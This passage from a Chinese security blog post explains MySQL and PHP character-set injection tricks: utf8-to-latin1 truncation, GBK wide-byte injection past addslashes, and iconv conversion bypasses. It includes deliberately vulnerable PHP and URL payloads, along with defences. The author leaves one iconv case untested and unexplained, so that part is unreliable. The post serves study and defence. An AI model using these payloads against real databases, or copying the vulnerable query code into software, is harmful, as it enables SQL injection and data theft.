Latin1<br>即字符集转换是：<code>utf8-&gt;utf8-&gt;latin1</code></p><p>进行以下测试<br>php源码：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ($username === <span class="string">'admin'</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> ($_SERVER[<span class="string">'REMOTE_ADDR'</span>] !== <span class="string">'127.0.0.1'</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">'Permission denied!'</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$result = $mysqli-&gt;query(<span class="string">"SELECT * FROM z_users where username = '&#123;$username&#125;' and password = '&#123;$password&#125;'"</span>);</span><br></pre></td></tr></table></figure></p><p>php中过滤了username参数admin，然后从数据库中返回username的内容<br>我们的目的是：<code>绕过PHP过滤，仍然可以从数据库中查询被过滤admin的内容</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/1.php?username=admin%e4     #在mysql中utf8转为latin1被截断为admin</span><br><span class="line">http://localhost/1.php?username=admin%e4%bd  #在mysql中utf8转为latin1被截断为admin</span><br><span class="line">http://localhost/1.php?username=admin%e4%bd%ac  #在mysql中utf8转为latin1失败，出错</span><br></pre></td></tr></table></figure><blockquote><p>中文‘佬’的utf8的16进制<code>\xE4\xBD\xAC</code><br>查看汉字UTF8编码：python <code>#encoding:utf8  print &#39;佬&#39;.encode(&#39;hex&#39;)</code></p></blockquote><blockquote><p>转换出错原因：latin1不支持汉字<br>截断原因：Mysql在转换字符集的时候，会将不完整的字符忽略</p></blockquote><p>所以只要我们给出UTF-8识别的16进制数据，然而不足以转化为latin1的字节数量，就会被截断<br>payload:<code>?username=admin%e4</code></p><h3 id="只有部分字符可以使用"><a href="#只有部分字符可以使用" class="headerlink" title="只有部分字符可以使用"></a>只有部分字符可以使用</h3><p>然而像%e4这样的16进制字符。并不是%00开始到%FF，都是可以被作为截断利用的<br>这关系到UTF-8的字符实现<br><a href="http://www.ruanyifeng.com/blog/2007/10/ascii_unicode_and_utf-8.html" target="_blank" rel="noopener">戳这里先了解UTF8</a><br><a href="http://utf8-chartable.de/unicode-utf8-table.pl" target="_blank" rel="noopener">这里可以查询UTF8 表</a></p><p>提取出重点，UTF-8是变长编码，有可能是1~4字节表示:</p><ul><li>一个字节时，字节的范围是[00-7F]</li><li>两个字节时，字节的范围是[C0-DF] [80-BF]</li><li>三个字节时，字节的范围是[E0-EF] [80-BF] [80-BF]</li><li>四个字节时，字节的范围是[F0-F7] [80-BF] [80-BF] [80-BF]</li></ul><p>然后根据RFC 3629规范，又有一些字节值是不允许出现在UTF-8编码中的：</p><p><img src="http://ww2.sinaimg.cn/large/006iKNp3gy1fr67z2z8w0j30yk0b6aen.jpg" alt="RFC 2629"></p><p>最终，规范UTF-8的第一字节的取值范围是:[00-7F] [C2-F4]</p><h3 id="Mysql-UTF8-特性"><a href="#Mysql-UTF8-特性" class="headerlink" title="Mysql UTF8 特性"></a>Mysql UTF8 特性</h3><p>又因为，Mysql 对于UTF-8有一特性：</p><blockquote><p>Mysql的utf8其实是阉割版utf-8编码，Mysql中的utf8字符集最长只支持三个字节<br>utf8mb4编码才是包含完整的UTF8</p></blockquote><p>所以，对于类似的绕过利用</p><ul><li>对于UTF8，可以利用第一个字节范围<code>[00-7F] [C2-EF]</code></li><li>对于UTF8mb4，可以利用第一个字节范围<code>[00-7F] [C2-F4]</code></li></ul><h2 id="宽字节注入"><a href="#宽字节注入" class="headerlink" title="宽字节注入"></a>宽字节注入</h2><p>上面说到 当<code>set names gbk</code>时，可以绕过addslashes过滤，达成sql注入</p><h3 id="addslashes过滤原理"><a href="#addslashes过滤原理" class="headerlink" title="addslashes过滤原理"></a>addslashes过滤原理</h3><p>addslashes() 函数返回在预定义字符之前添加反斜杠的字符串。<br>预定义字符变化是：</p><ul><li>单引号(‘) -&gt; <code>\&#39;</code></li><li>双引号(“) -&gt; <code>\&quot;</code></li><li>反斜杠() -&gt; <code>\\</code></li><li>NULL -&gt; <code>\NULL</code></li></ul><p>当关闭php设置magic_quotes_gpc，在外界参数进入sql语句之前,使用addslashes转移非法符号,再放入sql语句的变量中’’，可以防止sql注入<br>实例代码如下：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//连接数据库部分，注意使用了gbk编码，把数据库信息填写进去</span></span><br><span class="line">$conn = mysql_connect(<span class="string">'localhost'</span>, <span class="string">'root'</span>, <span class="string">'toor!@#$'</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">'bad!'</span>);</span><br><span class="line">mysql_query(<span class="string">"SET NAMES 'gbk'"</span>);</span><br><span class="line">mysql_select_db(<span class="string">'test'</span>, $conn) <span class="keyword">OR</span> emMsg(<span class="string">"连接数据库失败，未找到您填写的数据库"</span>);</span><br><span class="line"><span class="comment">//执行sql语句</span></span><br><span class="line">$id = <span class="keyword">isset</span>($_GET[<span class="string">'id'</span>]) ? addslashes($_GET[<span class="string">'id'</span>]) : <span class="number">1</span>;</span><br><span class="line">$sql = <span class="string">"SELECT * FROM news WHERE tid='&#123;$id&#125;'"</span>;</span><br><span class="line">$result = mysql_query($sql, $conn) <span class="keyword">or</span> <span class="keyword">die</span>(mysql_error()); <span class="comment">//sql出错会报错，方便观察</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta charset=<span class="string">"gbk"</span> /&gt;</span><br><span class="line">&lt;title&gt;新闻&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$row = mysql_fetch_array($result, MYSQL_ASSOC);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;h2&gt;&#123;$row['title']&#125;&lt;/h2&gt;&lt;p&gt;&#123;$row['content']&#125;&lt;p&gt;\n"</span>;</span><br><span class="line">mysql_free_result($result);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure></p><p>payload:<code>?id=1&#39;</code><br>经过addslashes函数，进入sql语句就变成<br><code>SELECT * FROM news WHERE tid=&#39;1\&#39;&#39;</code><br>无法造成单引号闭合，防止了sql注入</p><h3 id="绕过原理"><a href="#绕过原理" class="headerlink" title="绕过原理"></a>绕过原理</h3><p>得知addslashes过滤原理，就可以从两方面来绕过：</p><ul><li>在addslashes添加的<code>\</code>前面加入一个或奇数个<code>\</code>，变成<code>\\&#39;</code>，这样<code>\</code>被转义了，<code>&#39;</code>逃出了限制</li><li>想办法把addslashes添加的<code>\</code>弄没</li></ul><blockquote><p>GBK字符有一字节和双字节编码<br>一个字节时，字节的范围是[00-7F]<br>两个字节时，字节的范围是[81–FE] [40–7E]/[80-FE] 有根据第一个字节划分情况<br>Mysql的特性:mysql在使用GBK编码的时候，会认为两个字符是一个汉字（前一个ascii码要大于128，才到汉字的范围）</p></blockquote><p><img src="http://ww2.sinaimg.cn/large/006iKNp3gy1fr7lkcgyw4j30d60addg9.jpg" alt="GBK编码"></p><p>利用以上特性，假如在\前加入一个ASCII码大于128的字符</p><p><code>\&#39;</code>-&gt;%5c%27-&gt;<code>\&#39;</code><br><code>%df\&#39;</code>-&gt;%df%5c%27-&gt;<code>運&#39;</code><br><code>SELECT * FROM news WHERE tid=&#39;1運&#39;&#39;</code></p><p>以上的转换过程可以看出mysql对于字符的转化过程，单引号逃逸，闭合成功</p><h3 id="除了-df的其他字符"><a href="#除了-df的其他字符" class="headerlink" title="除了%df的其他字符"></a>除了%df的其他字符</h3><p>那么除了<code>%df</code>的还有什么字符可以呢，因为是mysql判断这个字符是不是宽字节字符(2个字节一个字符)<br>实际上，根据gbk编码，第一个字节ascii码大于128(即16进制80)，基本上就可以了。<br>比如修改<code>%df</code>为<code>%a1</code><br><code>%a1%5c</code>可能不是一个汉字，但一定会被mysql认为是一个宽字符，能够让后面的%27逃逸(%57 -&gt; \ %27 -&gt; ‘) </p><p>同时对于其他被addslashes过滤的符号，当然也可以用这种方法绕过</p><h3 id="除了GBK编码的其他编码"><a href="#除了GBK编码的其他编码" class="headerlink" title="除了GBK编码的其他编码"></a>除了GBK编码的其他编码</h3><p>那么除了GBK编码以外，还有什么其他编码可以用来宽字节注入<br>尝试跟GBK类似的<strong>GB2312</strong>，注入是不成功的</p><p>GB2312的两字节字符范围是[0xA1-0xF7] [0xA1~0xFE]</p><p>因为我们需要我们可控的 <strong>自定义的字节</strong> 与 <strong>0x57</strong> (\) 构成宽字节<br>而<code>0x57</code>根本不能作为GB2312的低字节字符，所以就不会被前面的自定义字节当做2个字节的宽字节字符吃掉，所以注入失败</p><p>所以我们可以得出：只要低位(最低位)的范围中含有0x5c的编码，就可以进行宽字符注入。</p><h3 id="mysql-real-escape-string-替代-addslashes-产生的漏洞"><a href="#mysql-real-escape-string-替代-addslashes-产生的漏洞" class="headerlink" title="mysql_real_escape_string 替代 addslashes 产生的漏洞"></a>mysql_real_escape_string 替代 addslashes 产生的漏洞</h3><p>在开发寻找宽字节的解决方案时，会考虑 <strong>mysql_real_escape_string</strong><br>因为在官方文档中说明这个函数会计及连接的当前字符集</p><p><img src="http://ww4.sinaimg.cn/large/006iKNp3gy1fr6ivuhbwxj30og07igmf.jpg" alt></p><p>于是，有的cms就把addslashes替换成mysql_real_escape_string，来抵御宽字符注入。</p><p>但是这样并没有用，仍然可以造成注入<br>原因就是，程序没有指定php连接mysql的字符集。我们需要在执行sql语句之前调用一下mysql_set_charset函数，设置当前连接的字符集为gbk。</p><p>即：</p><p><code>mysql_set_charset(&#39;gbk&#39;,$conn);</code><br><code>mysql_real_escape_string($_GET[&#39;id&#39;])</code></p><p>这样就可以避免注入</p><h3 id="防护宽字节注入"><a href="#防护宽字节注入" class="headerlink" title="防护宽字节注入"></a>防护宽字节注入</h3><ul><li>mysql_set_charset + mysql_real_escape_string</li><li>character_set_client设置为binary<br><code>SET character_set_connection=gbk,character_set_results=gbk,character_set_client=binary</code></li><li>不使用mysql函数调用数据库，使用mysqli或PDO</li></ul><h1 id="类似漏洞原理的php中的iconv"><a href="#类似漏洞原理的php中的iconv" class="headerlink" title="类似漏洞原理的php中的iconv"></a>类似漏洞原理的php中的iconv</h1><p>很多cms会将接收到数据，调用这样一个函数，转换其编码：<br><code>iconv(&#39;utf-8&#39;, &#39;gbk&#39;, $_GET[&#39;word&#39;]);</code><br><code>iconv(&#39;gbk&#39;, &#39;utf-8&#39;, $_GET[&#39;word&#39;]);</code><br>目的一般是为了避免乱码，特别是在搜索框的位置，这样子的字符集转换，也会有着类似的<strong>字符集转换漏洞</strong>。<br>关键源码：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mysql_query(<span class="string">"SET NAMES 'GBK'"</span>);</span><br><span class="line">mysql_select_db(<span class="string">'test'</span>,$conn) <span class="keyword">OR</span> emMsg(<span class="string">'链接数据库失败'</span>);</span><br><span class="line">mysql_query(<span class="string">"SET character_setconnection=gbk,character_set_results=gbk,character_set_client=binary"</span>,$conn);</span><br><span class="line">$id = <span class="keyword">isset</span>($_GET[<span class="string">'id'</span>] ? addslashes($_GET[<span class="string">'id'</span>]) : <span class="number">1</span>;</span><br><span class="line">$id = iconv(<span class="string">'utf-8'</span>,<span class="string">'gbk'</span>,$id);</span><br><span class="line">$sql = <span class="string">"SELECT * FROM news WHERE tid='&#123;$id&#125;'"</span>;</span><br><span class="line">$result = mysql_query($sql, $conn) <span class="keyword">or</span> <span class="keyword">die</span>(mysql_error());</span><br></pre></td></tr></table></figure></p><p>可以看到<code>character_set_client=binary</code>已经进行宽字节注入的防护<br>试试能不能通过<code>iconv</code>绕过addslashes</p><h3 id="iconv-‘utf-8’-‘gbk’-GET-‘id’"><a href="#iconv-‘utf-8’-‘gbk’-GET-‘id’" class="headerlink" title="iconv(‘utf-8’, ‘gbk’, $_GET[‘id’])"></a>iconv(‘utf-8’, ‘gbk’, $_GET[‘id’])</h3><blockquote><p>通常来说，一个gbk编码汉字，占用2个字节。一个utf-8编码的汉字，占用3个字节。</p></blockquote><p>如何绕过呢?<br>UTF-8的编码字符 会转化成GBK下对应的字符，即：<br>只要一个字符存在于<strong>UTF-8</strong>和<strong>GBK</strong>编码中，我们就可以控制UTF-8的字符，去得到GBK的字符</p><p>我们又知道在addslashes的影响下，输入<code>&#39;</code>会形成<code>%5c%27</code>，那么可以想办法输入一个<code>%5c</code>去注释addslashes加入的5c么<br>直接输入<code>%5c</code>自然是不行的，因为5c就是<code>\</code>也会被addslashes过滤</p><p>那么<code>錦</code>就可以作为这样的一个输入。<br>“錦”这个字，它的utf-8编码是<code>0xe98ca6</code>，它的gbk编码是<code>0xe55c</code></p><p><img src="http://ww4.sinaimg.cn/large/006iKNp3gy1fr7lp6wgpkj30cb0563yk.jpg" alt="utf8"></p><p><img src="http://ww4.sinaimg.cn/large/006iKNp3gy1fr7lplvr6jj30cr058q2y.jpg" alt="gbk"></p><p>当我们的<code>錦</code>被iconv从utf-8转换成gbk后，变成了<code>%e5%5c</code>，而后面的’被addslashes变成了%5c%27，这样组合起来就是%e5%5c%5c%27，两个%5c就是\，正好把反斜杠转义了，导致’逃逸出单引号，产生注入。</p><blockquote><p>那么神奇的问题出现了，按照GBK的编码规律，前一个字节大于ASCII码128(即0x80) 会被当成<strong>双字节字符</strong>解析成一个字符，<code>%e5&gt;%80</code>明明会被当成双字节解析，把后一个5c吃掉，咋会变成都是单字节解析，5c转义5c的尼？<br>花了忒长时间写这篇了….这里就不测试了，哪个小学弟小学妹帮我测试下吧，弄懂告诉我哈~</p></blockquote><p>那么假如反过来呢</p><h3 id="iconv-‘gbk’-‘utf-8’-GET-‘id’"><a href="#iconv-‘gbk’-‘utf-8’-GET-‘id’" class="headerlink" title="iconv(‘gbk’, ‘utf-8’, $_GET[‘id’])"></a>iconv(‘gbk’, ‘utf-8’, $_GET[‘id’])</h3><p>相同的环境，编码转换反过来，可以利用这个语句来绕过addslashes过滤么</p><p>这个利用原理就跟<code>宽字节注入</code>一模一样了吧，只是一个转换是在Mysql中，一个转换是在PHP中而已。<br>直接<code>%df&#39;</code>-&gt;<code>%df/&#39;</code>-&gt;<code>%df%5c%27</code><br>在iconv gbk 变成 utf-8时，会把<code>%df%5c</code>当做一个字符，转化成utf8编码的该字符，从而形成<code>%27</code>单引号逃逸</p><h1 id="后言"><a href="#后言" class="headerlink" title="后言"></a>后言</h1><p>尽管是一些比较老的漏洞了，一个PDO预编译+同一字符集就可以解决问题<br>但是也算是给自己在<strong>字符集转换漏洞</strong>上面理解了个大概。</p><p>理解各个字符集对于16进制数据的处理是很关键的，何时当做单字节字符，何时当做多字节字符，边界16进制范围是多少等。<br>当弄清楚这些时，去发掘字符集漏洞应该也有些许头绪了。</p><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p>离别歌：<a href="https://www.leavesongs.com/PENETRATION/mysql-charset-trick.html" target="_blank" rel="noopener">https://www.leavesongs.com/PENETRATION/mysql-charset-trick.html</a><br>离别歌：<a href="https://www.leavesongs.com/PENETRATION/mutibyte-sql-inject.html" target="_blank" rel="noopener">https://www.leavesongs.com/PENETRATION/mutibyte-sql-inject.html</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;— Mysql字符集漏洞 —&lt;br&gt;—  PHP 字符集漏洞  —&lt;br&gt;
    
    </summary>
    
    
      <category term="Mysql" scheme="http://lalajun.com/tags/Mysql/"/>
    
      <category term="漏洞分析" scheme="http://lalajun.com/tags/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    
  </entry>
  
</feed>
